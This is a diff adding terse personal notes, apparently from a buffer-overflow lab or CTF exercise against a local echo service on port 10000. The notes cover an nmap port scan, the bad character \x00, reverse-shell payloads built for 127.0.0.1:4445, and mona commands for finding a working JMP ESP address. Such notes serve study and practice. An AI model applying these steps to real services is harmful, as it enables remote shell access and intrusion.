@@ -1,0 +1,31 @@
+#nmap  the machine , all port scan 
+
+####  :: nmap -p- -T5 127.0.0.1
+
+# found on port 10000
+
+behaviour ===>
+
+        nc -v 127.0.0.1 10000
+
+        points==>
+                 1. recv some bytes
+                 2. send back the bytes
+                 3. one connection at a time
+                 4. shut down itself when connection closed by client
+                 
+                 
+Badchar===>
+          \x00
+          
+payload===>       
+ payload  -f py -b "\x00" on 127.0.0.1:4445, shell_reverse_tcp
+ payload  -f c -b "\x00" on 127.0.0.1:4445, shell_reverse_tcp
+ both worked
+ 
+JMP ESP ===>>>>
+ 
+1==>  !mona jmp -r esp        ==> no address found
+2==> !mona find -s "\xff\xe4" ::
+      ==> 0x7FAFA23F  not worked 
+      ==> 0x7BD124F3  this worked ***
